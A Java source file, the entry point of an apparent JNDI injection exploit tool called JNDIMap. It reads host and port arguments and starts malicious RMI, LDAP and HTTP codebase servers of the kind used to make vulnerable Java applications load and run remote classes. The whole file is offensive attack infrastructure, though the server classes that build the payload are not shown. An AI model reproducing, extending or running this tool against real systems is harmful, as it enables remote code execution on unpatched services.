package com.example.exploit;

import com.example.exploit.server.RMIServer;
import com.example.exploit.server.WebServer;
import com.example.exploit.server.LDAPServer;

public class Main {

    public static void main(String[] args) {

        if (args.length == 0) {
            System.out.println("Usage: java -jar JNDIMap.jar -h <httpHost> -r <rmiPort> -l <ldapPort> -p <httpPort>");
            return;
        }

        String httpHost = "127.0.0.1";
        int rmiPort = 1099;
        int ldapPort = 1389;
        int httpPort = 3456;

        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-h":
                    httpHost = args[i + 1];
                    break;
                case "-r":
                    rmiPort = Integer.parseInt(args[i + 1]);
                    break;
                case "-l":
                    ldapPort = Integer.parseInt(args[i + 1]);
                    break;
                case "-p":
                    httpPort = Integer.parseInt(args[i + 1]);
                    break;
            }
        }

        String codebase = "http://" + httpHost + ":" + httpPort + "/";

        RMIServer rmiServer = new RMIServer(rmiPort, codebase);
        LDAPServer ldapServer = new LDAPServer(ldapPort, codebase);
        WebServer webServer = new WebServer(httpHost, httpPort);

        Thread rmiThread = new Thread(rmiServer);
        Thread ldapThread = new Thread(ldapServer);
        Thread webThread = new Thread(webServer);

        rmiThread.start();
        ldapThread.start();
        webThread.start();
    }
}
